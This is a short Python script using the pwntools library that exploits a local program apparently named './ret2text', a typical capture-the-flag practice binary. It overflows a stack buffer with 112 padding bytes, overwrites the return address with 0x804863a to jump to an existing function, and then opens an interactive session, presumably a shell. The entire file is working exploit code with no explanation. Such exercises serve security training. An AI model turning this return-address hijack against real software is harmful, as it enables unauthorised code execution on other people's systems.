from pwn import *

p = process('./ret2text')

p.sendline(b'A' * (112) + p32(0x804863a))

p.interactive()
